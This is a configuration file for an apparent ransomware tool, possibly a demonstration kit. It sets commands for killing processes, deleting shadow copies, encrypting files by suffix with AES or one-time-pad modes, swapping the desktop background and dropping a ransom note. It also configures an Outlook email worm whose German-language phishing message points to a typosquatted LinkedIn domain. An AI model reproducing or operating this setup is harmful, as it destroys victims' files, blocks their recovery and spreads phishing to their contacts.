# This file can be used to set the flow and various properties of the attack
# Do not modify the values in <checker> and <parameter> for the individual properties.
# If the code is used as PyInstaller exe, then for files also only the filename can be entered
# \\+ is used as a escape sequenz for seperating text to multiple Hackboxes
# "Mode: execute" -> executes all the cmds in "sequence" sequenctially
# "Mode: show" -> shows all attributes of the builded objects 
# The keys cmd* in "sequence" can be renamed arbitrarily as long as they remain unique 
# abbreviations
  # commands:
    # KP = kills the given process name   # parameter <processname> requiered
    # AT = Adds running software as trusted, admin rights are requiered
    # SE = plays a given soundeffect  # parameter <soundeffect> requiered
    # HB = pops the "Hackbox" with the given message  # parameter <message> is requiered
    # SR = pops a console and shows the user the results of net user <username>
    # DS = deletes shadow-copys on the system, admin rights are requiered
    # PA = pops up a bunch of consoles with ascii-art combined
    # EF = encrypts files on the system
    # CB = changes the desktop background
    # EW = uses the Emailworm, outlook-app on system is requiered
    # PR = places the ransomnote on the desktop
# acronyms:
    # OTP = One Time Pad
    # INVB = inverted Bits
    # AES = Advanced Encryption Standard

Ransomware: 
  # threads for the exe to encrypt faster
  threadsNum: 
    value: 10         # options: <Number>; default: 0
    checker: type
    parameter: int
  # whether to modify the files to be encrypted with "overwrite" variant or "copy" variant
  fileMod: 
    value: overwrite  # options: overwrite, copy; default: overwrite
    checker: available
    parameter: overwrite, copy
  # list of suffixes used to search for files, which will be encrypted
  fileSuffixList: 
    value: txt, jfif, xlsx, docx, text, jpg, pdf, pptx, ppt, ics, json  # options: <Suffix1, Suffix2,...>; default: <empty list> 
    checker: 
    parameter:
  # Listing of directories which are skipped when searching for files, which will be encrypted
  dirBlacklist: 
    value: Program Files (x86), Program Files, Windows, PerfLogs, ProgramData, AppData, All Users, $Recycle.Bin # options <folder1, folder2,...>; default: <empty list>
    checker: 
    parameter:
  # the start directory from which the recursive search for matching files begins
  encArea: 
    value: desktop          # options: desktop, user, root, drives; default: desktop
    checker: available
    parameter: desktop, user, root, drives;
  # path for desktop background, which will be used in CB
  desktopBackground:
    value: ELITE_Hintergrund.png         # options: <path>; <empty string> 
    checker: openable
    parameter: 
  # path for ransomnote, which will be used in PR
  ransomnote: 
    value: ransom.docx     # options: <path>; <empty string> 
    checker: openable
    parameter: 
#########################################################################################################################################################
Encryption:
  # Which cryptographic encryption algorithm or file modification to use.
  encMode: 
    value: AES        # options: OTP, INVB, AES; defaut: INVB 
    checker: available
    parameter: OTP, INVB, AES
  # 16 characters long key
  key:
    value: abcdefghijklmnop            # options: <keyvalue>; default: aaaaaaaaaaaaaaaa
    checker: length
    parameter: 16
#########################################################################################################################################################
Emailworm:
  # wheter the E-mails will be displayed on the desktop before sendin them
  useDisplay:
    value: True
    checker: type
    parameter: bool
  # subject of the E-mail
  subject:
    value: "Sensible Daten auf deinem LinkedIn Profil"
    checker: 
    parameter:
  # message of the E-mail
  message:
    value: "Hallo, <br> <br> auf deinem Profil in LinkedIn sind sensible persönliche und unser Unternehmen betreffende <br>
    Informationen eingetragen worden. Schau dir das bitte mal auf LinkedIn an <a href=\"http://de.linkedln.com\">http://de.linkedln.com </a>. <br><br>
    Viele Grüße"
    checker:
    parameter:
